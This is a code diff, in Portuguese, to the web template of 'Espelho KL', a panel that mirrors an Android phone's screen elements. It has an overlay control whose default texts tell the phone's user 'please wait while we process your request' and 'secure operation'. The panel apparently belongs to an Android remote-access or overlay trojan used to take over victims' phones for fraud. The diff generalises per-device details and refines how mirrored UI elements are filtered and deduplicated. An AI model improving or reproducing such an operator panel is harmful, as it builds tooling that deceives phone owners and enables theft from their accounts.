@@ -507,7 +507,7 @@
     <div class="topbar">
         <div class="topbar-esquerda">
             <h1>Espelho KL</h1>
-            <p>Xiaomi 2312DRA50G • Android 13 • 1220 × 2466</p>
+            <p>{{ dispositivo.modelo }} • Android {{ dispositivo.android }} • {{ dispositivo.largura }} × {{ dispositivo.altura }}</p>
         </div>
         <div class="topbar-direita">
             <span class="status-online">🟢 online</span>
@@ -546,11 +546,11 @@
                 </div>
                 <div class="overlay-campo">
                     <label>Mensagem</label>
-                    <input id="mensagemOverlay" type="text" value="Aguarde enquanto processamos sua solicitação...">
+                    <input id="mensagemOverlay" type="text" value="Aguarde enquanto processamos sua solicitacao...">
                 </div>
                 <div class="overlay-campo">
                     <label>Texto Inferior</label>
-                    <input id="textoInferiorOverlay" type="text" value="Operação segura">
+                    <input id="textoInferiorOverlay" type="text" value="Operacao segura">
                 </div>
                 <div class="botoes-overlay">
                     <button class="btn-azul" onclick="confirmarTextoOverlay()">
@@ -638,9 +638,9 @@
 
     <script>
         // ==================== CONFIGURAÇÕES GERAIS ====================
-        const dispositivoId = "TKQ1.221114.001";
-        const larguraOriginal = 1220;
-        const alturaOriginal = 2466;
+        const dispositivoId = "{{ dispositivo.id }}";
+        const larguraOriginal = {{ dispositivo.largura or 1080 }};
+        const alturaOriginal = {{ dispositivo.altura or 2400 }};
         let escala = 0.35;
         let escalaAtual = 1;
         let elementosAtuais = [];
@@ -809,6 +809,14 @@
 
         // --- FUNÇÃO PRINCIPAL: RECONHECIMENTO AMPLIADO DE CLASSES ANDROID ---
         function identificarTipoElemento(classe = "", tipo = "") {
+            const t = (tipo || "").toLowerCase();
+            if (t === "botao") return "el-materialbutton";
+            if (t === "texto") return "el-textview";
+            if (t === "campo_texto") return "el-edittext";
+            if (t === "imagem") return "el-imageview";
+            if (t === "lista") return "el-recyclerview";
+            if (t === "selecao") return "el-checkbox";
+            if (t === "clicavel") return "el-materialbutton";
             if (!classe && !tipo) return "el-layout";
             const c = (classe || tipo).toLowerCase();
 
@@ -906,7 +914,8 @@
         }
 
         function obterTextoElemento(el) {
-            return el.rotulo || el.label || el.text || el.texto || el.descricao || el.dica || el.estado || el.viewId || el.recurso_id || "";
+            const bruto = el.rotulo || el.label || el.text || el.texto || el.descricao || el.dica || el.estado || el.viewId || el.recurso_id || "";
+            return String(bruto).split("\n")[0].trim();
         }
 
         function filtrarElementosEspelho(elementos) {
@@ -921,13 +930,57 @@
                 const clicavel = !!(el.clicavel || el.clickable);
                 const editavel = !!(el.editavel || el.editable);
 
-                const ehLayout = classe.includes("layout") || classe.includes("viewgroup") ||
-                    (tipo === "outro" && !clicavel && !editavel && !texto);
-                if (ehLayout) return false;
+                if (classe.includes("layout") || classe.includes("viewgroup") || classe.includes("framelayout")) {
+                    return false;
+                }
+                if (tipo === "clicavel" && (classe.includes("framelayout") || classe.includes("linearlayout"))) {
+                    return false;
+                }
+                if (tipo === "outro" && !clicavel && !editavel && !texto) {
+                    return false;
+                }
 
                 return texto || clicavel || editavel ||
-                    ["botao","texto","campo_texto","imagem","lista","selecao","clicavel","webview"].includes(tipo);
+                    ["botao","texto","campo_texto","imagem","lista","selecao","webview"].includes(tipo);
             });
+        }
+
+        function deduplicarElementosEspelho(elementos) {
+            const filtrados = filtrarElementosEspelho(elementos);
+            filtrados.sort((a, b) => {
+                const aa = (a.width || a.largura || 0) * (a.height || a.altura || 0);
+                const ab = (b.width || b.largura || 0) * (b.height || b.altura || 0);
+                return aa - ab;
+            });
+
+            const aceitos = [];
+            for (const el of filtrados) {
+                const texto = obterTextoElemento(el);
+                const x = el.x || 0;
+                const y = el.y || 0;
+                const w = el.width || el.largura || 0;
+                const h = el.height || el.altura || 0;
+
+                const redundante = aceitos.some(ex => {
+                    const et = obterTextoElemento(ex);
+                    const exX = ex.x || 0;
+                    const exY = ex.y || 0;
+                    const exW = ex.width || ex.largura || 0;
+                    const exH = ex.height || ex.altura || 0;
+                    const contem = exX >= x - 2 && exY >= y - 2 && exX + exW <= x + w + 2 && exY + exH <= y + h + 2;
+                    const contido = x >= exX - 2 && y >= exY - 2 && x + w <= exX + exW + 2 && y + h <= exY + exH + 2;
+
+                    if (contido && texto && et && et.includes(texto)) return true;
+                    if (contem && texto && et && texto.includes(et)) return true;
+                    if (texto && texto === et && Math.abs(exX - x) < 6 && Math.abs(exY - y) < 6) {
+                        return (w * h) > (exW * exH);
+                    }
+                    return false;
+                });
+
+                if (!redundante) aceitos.push(el);
+            }
+            return aceitos;
         }
 
         // ==================== RENDERIZAÇÃO DO ESPELHO ====================
@@ -936,7 +989,7 @@
             celular.style.width = `${larguraOriginal * escala}px`;
             celular.style.height = `${alturaOriginal * escala}px`;
 
-            const filtrados = filtrarElementosEspelho(elementos);
+            const filtrados = deduplicarElementosEspelho(elementos);
             const idsAtuais = new Set();
             filtrados.forEach((el, idx) => {
                 const id = idx;
@@ -980,8 +1033,9 @@
 
         // ==================== RENDERIZAÇÃO DA LISTA ====================
         function desenharLista(elementos) {
+            const elementosVisiveis = deduplicarElementosEspelho(elementos);
             const termoBusca = document.getElementById("busca-elementos").value.toLowerCase().trim();
-            let listaFiltrada = elementos;
+            let listaFiltrada = elementosVisiveis;
 
             if (termoBusca) {
                 listaFiltrada = elementos.filter(el => 
@@ -997,7 +1051,7 @@
             };
 
             listaFiltrada.forEach((el, idx) => {
-                const tipo = identificarTipoElemento(el.classe, el.type);
+                const tipo = identificarTipoElemento(el.classe, el.tipo || el.type);
                 if (tipo.includes("button")) grupos.buttons.push({...el, id: idx});
                 else if (tipo.includes("textview")) grupos.textviews.push({...el, id: idx});
                 else if (tipo.includes("edittext") || tipo.includes("textinput")) grupos.edittexts.push({...el, id: idx});
